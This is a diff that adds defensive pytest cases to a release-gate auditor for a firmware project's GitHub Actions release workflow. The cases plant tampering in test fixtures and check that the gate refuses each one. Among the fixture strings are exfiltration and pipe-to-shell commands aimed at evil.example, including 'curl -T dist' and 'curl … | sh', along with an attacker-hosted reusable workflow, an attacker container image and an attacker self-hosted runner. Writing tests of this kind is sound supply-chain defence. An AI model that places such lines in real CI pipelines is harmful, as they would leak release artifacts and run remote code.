@@ -43,6 +43,7 @@ the command settles determinism, not the reverse.
 """
 
 import pathlib
+import re
 import subprocess
 import sys
 
@@ -75,6 +76,10 @@ permissions: {}
 jobs:
   build:
     runs-on: ubuntu-latest
+    permissions:
+      contents: write # create the release + upload assets
+      id-token: write # keyless cosign + the attestation's Fulcio OIDC token
+      attestations: write # GitHub build-provenance attestation
     steps:
       - uses: actions/checkout@1111111111111111111111111111111111111111 # v7.0.1
       - uses: DeterminateSystems/nix-installer-action@2222222222222222222222222222222222222222 # v22
@@ -94,6 +99,7 @@ jobs:
           for pkg in firmware firmware-pqc firmware-fips; do
             out="$(nix build ".#$pkg" --no-link --print-out-paths)"
             label="${pkg#firmware}"; label="${label#-}"
+            [ -z "$label" ] && label="default"
             cp "$out/$pkg.uf2" "dist/rs-key-${tag}-${label}.uf2"
           done
       - name: reproducibility gate — rebuild all 3, require bit-identical
@@ -303,6 +309,11 @@ class Tree:
 @pytest.fixture
 def tree(tmp_path):
     return Tree(tmp_path)
+
+
+def published_line(tree):
+    """The region's `Published assets:` sentence — the set, without the commands."""
+    return next(line for line in tree.region().splitlines() if line.startswith("Published assets:"))
 
 
 def only(problems, needle):
@@ -922,7 +933,33 @@ def test_a_bare_dist_target_is_refused(tree):
               '            cp "$out/$pkg.uf2" "dist/rs-key-${tag}-${label}.uf2"\n'
               '            cp "$out/$pkg.elf" dist/')
     tree.regenerate()
-    assert only(tree.problems(), "a bare `dist/` target")
+    assert only(tree.problems(), "keeps the source's basename")
+
+
+def test_a_write_into_a_variable_directory_is_refused(tree):
+    """The same publication through a name the bare-`dist` form never read:
+    `cp "$out/$pkg.elf" "$d/"` adds fourteen unsigned ELFs to the release, and a
+    rule comparing the target to the literal `dist` was exit 0 on it.
+    """
+    tree.edit(WORKFLOW, '            cp "$out/$pkg.uf2" "dist/rs-key-${tag}-${label}.uf2"',
+              '            d=dist\n'
+              '            cp "$out/$pkg.uf2" "dist/rs-key-${tag}-${label}.uf2"\n'
+              '            cp "$out/$pkg.elf" "$d/"')
+    tree.regenerate()
+    assert only(tree.problems(), "keeps the source's basename")
+
+
+def test_a_removal_is_not_a_publication(tree):
+    """The other direction of the write-verb harvest, and it is not a no-op: the
+    region must go on listing exactly what it listed, so `rm` reads as neither a
+    finding nor an asset. Harvesting every `dist/` token instead put
+    `leftover.tmp` in the published set and on the page."""
+    before = published_line(tree)
+    tree.edit(WORKFLOW, "          mkdir -p dist",
+              "          mkdir -p dist\n          rm -f dist/leftover.tmp")
+    tree.regenerate()
+    assert tree.problems() == []
+    assert published_line(tree) == before, "a removal was read as a publication"
 
 
 def test_without_rule_8d_the_bare_target_is_not_found(tree, monkeypatch):
@@ -1087,6 +1124,554 @@ def test_a_moved_action_pin_stays_green_and_moves_the_region(tree):
     assert "4444444444444444444444444444444444444445" in tree.region()
 
 
+# --- the row's own exit code ---------------------------------------------------
+#
+# Everything above drives `audit()` and reads its findings. The `check.sh` row
+# reads neither: it reads the process's EXIT CODE. Measured on the first version
+# of this table — `return 1` flipped to `return 0` in `run()` printed the finding
+# to stderr and exited 0 over a tampered region, and the 76 cases here were 76
+# passed either way. Deleting the whole `if findings:` block was the same, silent.
+# So the row was a row that could not go red, and its table could not see it.
+
+
+def mutant_run():
+    """`run()` with its non-zero return flipped to zero — the defect, compiled.
+
+    Built out of this module's own source rather than written out here, so the arm
+    cannot drift from the function it is the mutation of. It also pins that there
+    is exactly one such return to flip: a second one added later and left
+    unasserted is the same hole again.
+    """
+    source = (ROOT / "scripts/release_gate.py").read_text()
+    block = source[source.index("\ndef run("):source.index("\ndef main(")]
+    assert block.count("return 1") == 1, "run() no longer has one non-zero exit"
+    namespace = dict(vars(release_gate))
+    exec(block.replace("return 1", "return 0"), namespace)  # the mutation, compiled
+    return namespace["run"]
+
+
+def test_a_finding_exits_nonzero_and_names_itself_on_stderr(tree, monkeypatch, capsys):
+    """The direction that matters: the row goes RED, and it says why."""
+    monkeypatch.setattr(release_gate, "audit", lambda *a, **k: (["a tampered region"], "ok"))
+    assert release_gate.run(tree.root) == 1
+    printed = capsys.readouterr()
+    assert "a tampered region" in printed.err
+    assert "a tampered region" not in printed.out, "a finding on stdout is not a red row"
+
+
+def test_the_mutation_that_survived_this_table_is_caught_now(tree, monkeypatch):
+    """The arm for the case above, in the direction the sweep measured.
+
+    Under the mutation the finding is still printed and the exit code is still 0,
+    so a case asserting only that stderr carries the text would be GREEN on the
+    defect. The assertion that fails is the exit code, and this says so.
+    """
+    monkeypatch.setattr(release_gate, "audit", lambda *a, **k: (["a tampered region"], "ok"))
+    assert mutant_run()(tree.root) == 0, "the mutation no longer describes the defect"
+
+
+def test_a_clean_audit_exits_zero_and_prints_its_summary(tree, monkeypatch, capsys):
+    """The other arm of the exit code, and it is not a no-op: a gate wired to
+    return 1 unconditionally would pass the case above and fail this one."""
+    monkeypatch.setattr(release_gate, "audit", lambda *a, **k: ([], "release-gate: ok — …"))
+    assert release_gate.run(tree.root) == 0
+    assert "release-gate: ok" in capsys.readouterr().out
+
+
+def test_main_carries_the_exit_code_out_to_the_row(tree, monkeypatch):
+    """`main()` is what `check.sh` actually enters, and it delegates — so the
+    delegation is driven too, over the checkout `ROOT` the row runs on."""
+    monkeypatch.setattr(release_gate, "audit", lambda *a, **k: (["a tampered region"], "ok"))
+    assert release_gate.main([]) == 1
+    monkeypatch.setattr(release_gate, "audit", lambda *a, **k: ([], "release-gate: ok"))
+    assert release_gate.main([]) == 0
+
+
+def test_an_unknown_argument_is_a_usage_error(capsys):
+    """The third exit code. `--wirte` must not be read as "no argument" and run
+    the audit, and `--write` is the one argument that REWRITES the page."""
+    assert release_gate.main(["--wirte"]) == 2
+    assert "usage" in capsys.readouterr().err
+
+
+def test_the_row_this_gate_is_exits_zero_on_this_checkout():
+    """The row as `check.sh` runs it, from the command line, exit code unpiped.
+
+    `test_check_sh_runs_this_row` asserts the row's TEXT and never runs it; a
+    guard is falsified through the row that runs it, not through its own function.
+    """
+    done = subprocess.run(
+        [sys.executable, str(ROOT / "scripts/release_gate.py")],
+        cwd=ROOT, capture_output=True, text=True,
+    )
+    assert done.returncode == 0, done.stderr
+    assert done.stdout.startswith("release-gate: ok — ")
+
+
+# --- rule 1d: the job's own keys -----------------------------------------------
+
+
+def test_a_job_switched_off_in_place_is_refused(tree):
+    """`if: false` at the JOB's indent: no step runs, and every step rule here
+    reads the steps. Measured at exit 0, with the region going on printing all
+    fifteen as "the steps a release runs"."""
+    tree.edit(WORKFLOW, "  build:\n    runs-on:", "  build:\n    if: false\n    runs-on:")
+    assert only(tree.problems(), "not one of ['permissions'")
+
+
+@pytest.mark.parametrize("added", [
+    "    container: attacker/img:latest",
+    "    strategy:\n      matrix:\n        n: [1, 2]",
+    "    continue-on-error: true",
+    "    defaults:\n      run:\n        shell: python",
+])
+def test_a_job_key_outside_the_vocabulary_is_refused(tree, added):
+    """`strategy: matrix` runs the whole job N times; `container:` runs it
+    somewhere else; `continue-on-error` lets it fail; `defaults: run: shell:`
+    makes every block on this page something other than bash. None of the four
+    changes a command, and commands are what every other rule here reads."""
+    key = added.strip().split(":")[0]
+    tree.edit(WORKFLOW, "    runs-on: ubuntu-latest",
+              f"    runs-on: ubuntu-latest\n{added}")
+    assert only(tree.problems(), f"'{key}'")
+
+
+def test_a_self_hosted_runner_is_refused(tree):
+    tree.edit(WORKFLOW, "    runs-on: ubuntu-latest",
+              "    runs-on: [self-hosted, attacker-box]")
+    assert only(tree.problems(), "a self-hosted or containerised runner")
+
+
+def test_a_widened_job_scope_is_refused(tree):
+    tree.edit(WORKFLOW, "      id-token: write", "      id-token: write\n      packages: write")
+    assert only(tree.problems(), "a scope no entry here opens")
+
+
+def test_a_second_job_is_refused(tree):
+    """A job with no `steps:` of its own is invisible to the parser-completeness
+    rule, which counts `steps:` blocks — this counts the jobs."""
+    tree.append(WORKFLOW, "  mirror:\n    runs-on: ubuntu-latest\n    uses: ./x.yml\n")
+    assert only(tree.problems(), "carries 2 job(s)")
+
+
+def test_a_blank_line_does_not_end_the_job(tree):
+    """A green arm that is not a no-op: the job's keys are read by INDENT, and a
+    YAML mapping may carry a blank line anywhere. Read as the end of the job, the
+    parse stops before `permissions:` and the rule reports scopes the file
+    plainly holds."""
+    tree.edit(WORKFLOW, "    runs-on: ubuntu-latest\n    permissions:",
+              "    runs-on: ubuntu-latest\n\n    permissions:")
+    tree.regenerate()
+    assert tree.problems() == []
+
+
+def test_a_workflow_with_no_jobs_key_is_a_finding_not_a_crash(tree):
+    """`jobs:` renamed away: the job reader has nothing to read, and this says so
+    rather than raising out of the middle of the audit."""
+    tree.edit(WORKFLOW, "jobs:\n", "jobz:\n")
+    tree.regenerate()
+    assert only(tree.problems(), "carries 0 job(s)")
+
+
+def test_without_rule_1d_the_disarmed_job_stands(tree, monkeypatch):
+    gone(monkeypatch, "check_job")
+    tree.edit(WORKFLOW, "  build:\n    runs-on:", "  build:\n    if: false\n    runs-on:")
+    tree.regenerate()
+    assert tree.problems() == []
+
+
+# --- rule 1c, widened: the shapes the first spelling walked past ----------------
+
+
+def test_a_step_that_swallows_its_failure_with_a_semicolon_is_refused(tree):
+    """`; true` after the rebuild, where the rule read only `|| true`."""
+    tree.edit(WORKFLOW, '            nix build ".#$pkg" --rebuild --no-link',
+              '            nix build ".#$pkg" --rebuild --no-link ; true')
+    assert only(tree.problems(), "swallows a failure")
+
+
+def test_a_step_that_swallows_its_failure_into_an_echo_is_refused(tree):
+    tree.edit(WORKFLOW, '            nix build ".#$pkg" --rebuild --no-link',
+              '            nix build ".#$pkg" --rebuild --no-link || echo skipped')
+    assert only(tree.problems(), "swallows a failure")
+
+
+def test_a_conditional_or_is_not_a_disarm(tree):
+    """The green arm, and the reason [`DISARM_SUFFIX`] is a closed set: the real
+    workflow's SBOM step runs `[ -e "$f" ] || continue` inside a `for`, and a rule
+    reading every `||` calls the job's own control flow a swallowed failure."""
+    tree.edit(WORKFLOW, "          mkdir -p dist",
+              '          [ -e dist ] || continue\n          mkdir -p dist')
+    tree.regenerate()
+    assert tree.problems() == []
+    # And that the case is not vacuous: the open form the review proposed fires.
+    assert re.search(r"\|\|\s*\S", '[ -e "$f" ] || continue')
+    assert not release_gate.DISARM_SUFFIX.search('[ -e "$f" ] || continue')
+
+
+def test_a_step_that_turns_off_errexit_is_refused(tree):
+    """The one shape a per-command rule can never see: `set +e` leaves every
+    command in the block exactly as this page prints it and makes all of them
+    advisory."""
+    tree.edit(WORKFLOW, "          for pkg in firmware firmware-pqc firmware-fips; do\n"
+                        "            nix build",
+              "          set +e\n          for pkg in firmware firmware-pqc firmware-fips; do\n"
+              "            nix build")
+    assert only(tree.problems(), "advisory from there on")
+
+
+def test_without_the_errexit_clause_the_disarmed_block_stands(tree, monkeypatch):
+    monkeypatch.setattr(release_gate, "DISARM_SET", re.compile(r"(?!x)x"))
+    tree.edit(WORKFLOW, "          for pkg in firmware firmware-pqc firmware-fips; do\n"
+                        "            nix build",
+              "          set +e\n          for pkg in firmware firmware-pqc firmware-fips; do\n"
+              "            nix build")
+    tree.regenerate()
+    assert tree.problems() == []
+
+
+def test_a_step_that_is_not_a_shell_script_is_refused(tree):
+    """`shell: python` leaves the block on the page as bash and runs it as
+    something else, so every command printed for that step is a mis-read."""
+    tree.edit(WORKFLOW, "      - name: checksums\n        run: |",
+              "      - name: checksums\n        shell: python\n        run: |")
+    assert only(tree.problems(), "prints its block as bash")
+
+
+def test_without_the_misread_keys_the_python_step_stands(tree, monkeypatch):
+    monkeypatch.setattr(release_gate, "MISREAD_KEYS", ())
+    tree.edit(WORKFLOW, "      - name: checksums\n        run: |",
+              "      - name: checksums\n        shell: python\n        run: |")
+    tree.regenerate()
+    assert tree.problems() == []
+
+
+# --- rule 1b + 6: what the CALLER runs and releases ----------------------------
+
+
+def test_a_second_called_workflow_carrying_a_ref_is_refused(tree):
+    """The membership form read `uses: x.yml` and never `uses: …/x.yml@v1`, so a
+    second called workflow was invisible exactly when it came from elsewhere."""
+    tree.append(CALLER, "  extra:\n    uses: attacker/repo/.github/workflows/evil.yml@v1\n")
+    assert only(tree.problems(), "evil.yml")
+
+
+def test_a_caller_that_runs_steps_of_its_own_is_refused(tree):
+    """Rule 6 holds what the caller CALLS and is blind to what it RUNS."""
+    tree.append(CALLER, "  extra:\n    runs-on: ubuntu-latest\n    steps:\n"
+                        "      - name: exfiltrate\n        run: curl -T dist https://evil.example\n")
+    assert only(tree.problems(), "a step of its own")
+
+
+def test_a_widened_tag_trigger_is_refused(tree):
+    tree.edit(CALLER, '    tags: ["v*"]', '    tags: ["**"]')
+    assert only(tree.problems(), "the admission rule one layer above")
+
+
+def test_without_the_trigger_clause_the_widened_tags_stand(tree, monkeypatch):
+    monkeypatch.setattr(release_gate, "TRIGGER", '["**"]')
+    tree.edit(CALLER, '    tags: ["v*"]', '    tags: ["**"]')
+    tree.regenerate()
+    assert tree.problems() == []
+
+
+# --- rule 4e + 4f: the label rule, and a knob no name carries ------------------
+
+
+def test_a_changed_label_rule_is_refused(tree):
+    """The field this manifest calls derived and re-implemented instead: the
+    workflow's shell renames every published asset, `label_of` does not follow,
+    and the region goes on printing the old names. Measured at exit 0."""
+    tree.edit(WORKFLOW, 'label="${pkg#firmware}"', 'label="rc1-${pkg#firmware}"')
+    assert only(tree.problems(), "renames the published set")
+
+
+def test_without_rule_4e_the_renamed_labels_stand(tree, monkeypatch):
+    gone(monkeypatch, "check_label_rule")
+    tree.edit(WORKFLOW, 'label="${pkg#firmware}"', 'label="rc1-${pkg#firmware}"')
+    tree.regenerate()
+    assert tree.problems() == []
+
+
+def test_a_flavor_carrying_a_test_only_knob_is_refused(tree):
+    """`fakeMkek` is a declarative derivation argument, so neither the package
+    name nor its `cargoFlags` carries it — both readings `check_no_touch` has."""
+    tree.edit(NIX, '    firmware-fips = mkFirmware {\n      name = "firmware-fips";',
+              '    firmware-fips = mkFirmware {\n      name = "firmware-fips";\n'
+              '      fakeMkek = "00";')
+    assert only(tree.problems(), "TEST builds only")
+
+
+def test_without_rule_4f_the_test_key_flavor_stands(tree, monkeypatch):
+    gone(monkeypatch, "check_test_knobs")
+    tree.edit(NIX, '    firmware-fips = mkFirmware {\n      name = "firmware-fips";',
+              '    firmware-fips = mkFirmware {\n      name = "firmware-fips";\n'
+              '      fakeMkek = "00";')
+    tree.regenerate()
+    assert tree.problems() == []
+
+
+# --- rule 1f: the roster reads in the job's order ------------------------------
+
+
+def test_a_reordered_step_is_refused(tree):
+    """Moving `sign SHA256SUMS` above `checksums` signs a file that does not
+    exist yet; every set-shaped rule here stays green on it."""
+    signing = ("      - name: sign SHA256SUMS (keyless cosign)\n        run: |\n"
+               "          cosign sign-blob --bundle dist/SHA256SUMS.sigstore.json dist/SHA256SUMS\n")
+    tree.edit(WORKFLOW, signing, "")
+    tree.edit(WORKFLOW, "      - name: checksums\n", signing + "      - name: checksums\n")
+    assert only(tree.problems(), "in the job's order")
+
+
+def test_without_rule_1f_the_reordered_step_stands(tree, monkeypatch):
+    gone(monkeypatch, "check_entry_order")
+    signing = ("      - name: sign SHA256SUMS (keyless cosign)\n        run: |\n"
+               "          cosign sign-blob --bundle dist/SHA256SUMS.sigstore.json dist/SHA256SUMS\n")
+    tree.edit(WORKFLOW, signing, "")
+    tree.edit(WORKFLOW, "      - name: checksums\n", signing + "      - name: checksums\n")
+    tree.regenerate()
+    assert tree.problems() == []
+
+
+# --- the comment cut, where a shell would make it ------------------------------
+
+
+def mutant_steps():
+    """`steps()` with its dedent terminator removed — the second `mutant_run`.
+
+    The parser stops collecting a step's `run:` body when a line dedents to the
+    steps' own level. Nothing drove that: every case that adds a second job adds
+    it at an indent where the two readings agree, so the clause could be deleted
+    with the table green.
+    """
+    source = (ROOT / "scripts/release_gate.py").read_text()
+    block = source[source.index("\ndef steps("):source.index("\ndef step_items(")]
+    terminator = ("        if raw.strip() and indent <= depth:\n"
+                  "            current = None\n"
+                  "            continue\n")
+    assert block.count(terminator) == 1, "steps() no longer carries the terminator"
+    namespace = dict(vars(release_gate))
+    exec(block.replace(terminator, ""), namespace)  # the mutation, compiled
+    return namespace["steps"]
+
+
+#: A second job whose `steps:` sit at another indent, with a `run:` body indented
+#: DEEPER than the first job's. Both halves matter: at another indent its items
+#: are not steps, and deeper than `at` is what makes the lines readable as more of
+#: the previous step's block.
+LEAKING_JOB = ("  mirror:\n    steps:\n    - name: exfiltrate\n"
+               "      run: |\n          curl -T dist https://evil.example\n")
+
+
+def test_a_second_job_does_not_leak_into_the_last_steps_commands(tree):
+    """The completeness rule counts that second `steps:` block. This is the other
+    half: its deeper lines must not be read as more of the LAST step's `run:`,
+    which would print a command on this page under a step that never runs it."""
+    tree.append(WORKFLOW, LEAKING_JOB)
+    tree.regenerate()
+    assert "evil.example" not in tree.region()
+    assert only(tree.problems(), "`steps:` block(s)")
+
+
+def test_without_the_dedent_terminator_the_second_job_leaks(tree):
+    """The arm, and the direction: without it the payload is appended to `create
+    the GitHub Release`, so the page prints it as a command that step runs."""
+    tree.append(WORKFLOW, LEAKING_JOB)
+    job = mutant_steps()((tree.root / WORKFLOW).read_text())
+    assert "evil.example" in job[-1]["block"]
+    assert "evil.example" not in release_gate.steps((tree.root / WORKFLOW).read_text())[-1]["block"]
+
+
+def test_a_payload_behind_a_quoted_hash_is_printed(tree):
+    """The mis-read, not a residue: cut at the first ` #` whatever quotes it,
+    `echo "tag # done"; curl … | sh` reads as `echo "tag` and the half that runs
+    appears on this page nowhere."""
+    tree.edit(WORKFLOW, "          mkdir -p dist",
+              '          echo "tag # done"; curl -s https://evil.example/p | sh\n          mkdir -p dist')
+    tree.regenerate()
+    assert "evil.example" in tree.region()
+
+
+def test_a_real_trailing_comment_is_still_cut(tree):
+    """The other arm, and the reason the cut exists at all: `true # cargo …` runs
+    the `true`, and the comment is not a command a release runs."""
+    tree.edit(WORKFLOW, "          mkdir -p dist", "          mkdir -p dist # not a command")
+    tree.regenerate()
+    assert "not a command" not in tree.region()
+    assert release_gate.cut_at_comment("echo 'a # b'", None) == ("echo 'a # b'", None)
+    assert release_gate.cut_at_comment("awk '", None) == ("awk '", "'")
+    assert release_gate.cut_at_comment("/^### x/ { print }", "'")[0] == "/^### x/ { print }"
+
+
+# --- rule 3a: the frontier under another spelling -------------------------------
+
+
+@pytest.mark.parametrize("spelling", ["source-to-binary", "source→binary", "miscompilation"])
+def test_the_frontier_under_another_spelling_is_refused(tree, monkeypatch, spelling):
+    """`FRONTIER` is one token so the claim is SAID once; comparing that one
+    token is how a refusal is walked past. `source-to-binary` is the spelling
+    `assurance/platform.toml` uses for the very same gap."""
+    monkeypatch.setattr(release_gate, "SUBJECTS", {**release_gate.SUBJECTS, spelling: "x"})
+    assert only(tree.problems(), "reachable as an entry's subject")
+
+
+def test_a_gloss_rewritten_into_the_frontier_is_refused(tree, monkeypatch):
+    """The third route: leave the key, rewrite what it MEANS. The rule read only
+    keys, and the glosses were printed nowhere, so nothing could see it."""
+    monkeypatch.setattr(release_gate, "SUBJECTS",
+                        {**release_gate.SUBJECTS, "inventory": "semantic preservation of the source"})
+    assert only(tree.problems(), "reachable as an entry's subject")
+
+
+def test_the_glosses_are_printed_where_a_reader_can_check_them(tree):
+    """The other half of that fix: a gloss nothing reads is a gloss anything can
+    be written into, so all six are rendered into the byte-diffed region."""
+    region = tree.region()
+    for name, gloss in release_gate.SUBJECTS.items():
+        assert f"| `{name}` |" in region and gloss in region
+
+
+# --- rule 7: git's floor is four, not seven -------------------------------------
+
+
+def test_a_six_character_commit_abbreviation_is_refused(tree):
+    """`{7,40}` was justified as "git's own shortest unambiguous abbreviation".
+    It is not: 7 is git's default DISPLAY width and its floor is 4, so a six-hex
+    revision in a `run:` line was exit 0 and stale on the next commit."""
+    # In the checksums step, which has no `for pkg in`: an abbreviation that
+    # happens to be all digits is a typed count to the rule beside this one, and
+    # that would redden the arm for a reason it is not about.
+    tree.edit(WORKFLOW, "          cd dist",
+              f"          echo built at {tree.head()[:6]}\n          cd dist")
+    tree.regenerate()
+    assert only(tree.problems(), "names a commit of this repository")
+
+
+def test_a_short_hex_run_that_is_no_commit_stays_green(tree):
+    """The widening's cost, and that it is only cost: four hex characters are
+    everywhere in a release page, and none of them resolves."""
+    tree.edit(WORKFLOW, "          mkdir -p dist",
+              "          echo beef cafe dead\n          mkdir -p dist")
+    tree.regenerate()
+    assert tree.problems() == []
+
+
+# --- rule 8c: the arm that had no case ------------------------------------------
+
+
+def test_a_release_create_with_no_dist_operand_is_refused(tree):
+    """The early return of `check_uploaded`: with no `dist/` operand this manifest
+    cannot say which of the files the job wrote are published, and the rule that
+    would have said so is the one being skipped."""
+    tree.edit(WORKFLOW, 'gh release create "$tag" --notes-file release-notes.md dist/*',
+              'gh release create "$tag" --notes-file release-notes.md')
+    assert only(tree.problems(), "no `gh release create` operand under `dist/`")
+
+
+def test_without_rule_8c_the_operandless_upload_is_not_found(tree, monkeypatch):
+    gone(monkeypatch, "check_uploaded")
+    tree.edit(WORKFLOW, 'gh release create "$tag" --notes-file release-notes.md dist/*',
+              'gh release create "$tag" --notes-file release-notes.md')
+    tree.regenerate()
+    assert tree.problems() == []
+
+
+# --- the arm for every clause added by the second review ------------------------
+#
+# Each is the narrow form the clause REPLACED, put back: the break stays in
+# place, and the run without the clause is wholly green. An arm that deletes the
+# judgement and its derivation together says which of the two found nothing.
+
+
+NARROW_SUFFIX = re.compile(r"\|\|\s*(?:true|:)\s*$")
+NARROW_CALLED = re.compile(r"^\s+uses:\s*(?P<path>\S+\.ya?ml)\s*$", re.M)
+NARROW_HEXRUN = re.compile(r"(?<![0-9a-fA-F])[0-9a-fA-F]{7,40}(?![0-9a-fA-F])")
+NARROW_UNNAMEABLE = re.compile(r"^dist/?$")
+NARROW_SPELLINGS = re.compile(re.escape(release_gate.FRONTIER))
+
+
+def test_without_the_widened_suffix_the_semicolon_disarm_stands(tree, monkeypatch):
+    monkeypatch.setattr(release_gate, "DISARM_SUFFIX", NARROW_SUFFIX)
+    tree.edit(WORKFLOW, 'nix build ".#$pkg" --rebuild --no-link',
+              'nix build ".#$pkg" --rebuild --no-link ; true')
+    tree.regenerate()
+    assert tree.problems() == []
+
+
+def test_without_the_widened_suffix_the_echo_disarm_stands(tree, monkeypatch):
+    monkeypatch.setattr(release_gate, "DISARM_SUFFIX", NARROW_SUFFIX)
+    tree.edit(WORKFLOW, 'nix build ".#$pkg" --rebuild --no-link',
+              'nix build ".#$pkg" --rebuild --no-link || echo skipped')
+    tree.regenerate()
+    assert tree.problems() == []
+
+
+def test_without_the_ref_aware_pattern_the_pinned_caller_stands(tree, monkeypatch):
+    monkeypatch.setattr(release_gate, "CALLED", NARROW_CALLED)
+    tree.append(CALLER, "  extra:\n    uses: attacker/repo/.github/workflows/evil.yml@v1\n")
+    tree.regenerate()
+    assert tree.problems() == []
+
+
+def test_without_the_caller_steps_clause_the_callers_own_step_stands(tree, monkeypatch):
+    gone(monkeypatch, "check_caller_steps")
+    tree.append(CALLER, "  extra:\n    runs-on: ubuntu-latest\n    steps:\n"
+                        "      - name: exfiltrate\n        run: curl -T dist https://evil.example\n")
+    tree.regenerate()
+    assert tree.problems() == []
+
+
+def test_without_the_widened_hexrun_the_six_character_revision_stands(tree, monkeypatch):
+    monkeypatch.setattr(release_gate, "HEXRUN", NARROW_HEXRUN)
+    # In the checksums step, which has no `for pkg in`: an abbreviation that
+    # happens to be all digits is a typed count to the rule beside this one, and
+    # that would redden the arm for a reason it is not about.
+    tree.edit(WORKFLOW, "          cd dist",
+              f"          echo built at {tree.head()[:6]}\n          cd dist")
+    tree.regenerate()
+    assert tree.problems() == []
+
+
+def test_without_the_shape_test_the_variable_directory_stands(tree, monkeypatch):
+    monkeypatch.setattr(release_gate, "UNNAMEABLE", NARROW_UNNAMEABLE)
+    tree.edit(WORKFLOW, '            cp "$out/$pkg.uf2" "dist/rs-key-${tag}-${label}.uf2"',
+              '            d=dist\n'
+              '            cp "$out/$pkg.uf2" "dist/rs-key-${tag}-${label}.uf2"\n'
+              '            cp "$out/$pkg.elf" "$d/"')
+    tree.regenerate()
+    assert tree.problems() == []
+
+
+def test_without_the_write_verbs_a_removal_is_a_publication(tree, monkeypatch):
+    """The harvest's arm. Not a deletion — the clause IS the narrowing, so the
+    arm is the wide reading it replaced, and the region then lists a file the
+    release deletes."""
+    monkeypatch.setattr(release_gate, "written",
+                        lambda command: re.findall(r"(dist/[\w.${}<>-]+)", command))
+    tree.edit(WORKFLOW, "          mkdir -p dist",
+              "          mkdir -p dist\n          rm -f dist/leftover.tmp")
+    tree.regenerate()
+    assert "leftover.tmp" in published_line(tree)
+
+
+def test_without_the_spelling_set_the_other_frontier_words_stand(tree, monkeypatch):
+    monkeypatch.setattr(release_gate, "FRONTIER_SPELLINGS", NARROW_SPELLINGS)
+    monkeypatch.setattr(release_gate, "SUBJECTS",
+                        {**release_gate.SUBJECTS, "source-to-binary": "x"})
+    tree.regenerate()
+    assert tree.problems() == []
+
+
+def test_the_shared_reader_is_what_truncated_the_payload():
+    """The `commands()` arm, stated over the reader it stopped using: this is the
+    text `gate_lines.split_at_comment` returns for the same line, and it is why a
+    quote-blind cut is a mis-read here rather than a residue."""
+    line = 'echo "tag # done"; curl -s https://evil.example/p | sh'
+    assert gate_lines.split_at_comment(line)[0] == 'echo "tag'
+    assert release_gate.commands(line + "\n") == [line]
+
+
 # --- how this generator registers ----------------------------------------------
 
 
@@ -1128,10 +1713,40 @@ def test_the_shipped_map_cannot_derive_the_frontier():
 
 def test_check_sh_runs_this_row():
     """The row, with its flags — a name match cannot see a `--write` typed into
-    the gate row, which would rewrite the page instead of diffing it."""
+    the gate row, which would rewrite the page instead of diffing it.
+
+    Where the row SITS was argued from a line number that has since moved, so the
+    argument is restated rather than kept: the `SEC-FIDO-002` citations the first
+    version reasoned about were re-anchored on the row's NAME by `d544aa1`, and
+    that reason is gone. The conclusion holds for another one, asserted below
+    rather than written: every line-numbered citation of `check.sh` in the tree
+    is ABOVE this row, so inserting it renumbered none of them — and the highest
+    of them is the `assurance-trace image identity` row that `SEC-FIDO-006`'s
+    discharge rests on, cited twice.
+    """
     text = (ROOT / "scripts/check.sh").read_text()
     assert gate_lines.runs(text, "scripts/release_gate.py")
     code = [gate_lines.split_at_comment(body)[0]
             for _indent, body in gate_lines.logical_lines(text)]
     rows = [line for line in code if "scripts/release_gate.py" in line]
     assert rows == ['run "release manifest"        python scripts/release_gate.py'], rows
+
+
+def test_this_row_sits_below_every_line_numbered_citation_of_check_sh():
+    """The placement argument above, as a measurement rather than a sentence.
+
+    Inserting a row renumbers every line under it, and this tree cites `check.sh`
+    by line from `assurance/bundle/`. The row went in below all of them, so it
+    moved none — and a later row that does not would break a discharge's citation
+    silently, since a shifted line still resolves to something.
+    """
+    needle = "scripts/check.sh" + ":"
+    found = subprocess.run(
+        ["git", "-C", str(ROOT), "grep", "-hoE", re.escape(needle) + r"[0-9]+"],
+        capture_output=True, text=True,
+    )
+    cited = sorted({int(hit.rsplit(":", 1)[1]) for hit in found.stdout.split()})
+    assert cited, "nothing cites check.sh by line any more; drop this case"
+    text = (ROOT / "scripts/check.sh").read_text().splitlines()
+    row = next(i for i, line in enumerate(text, 1) if "scripts/release_gate.py" in line)
+    assert row > max(cited), f"this row is at {row} and {max(cited)} is cited"
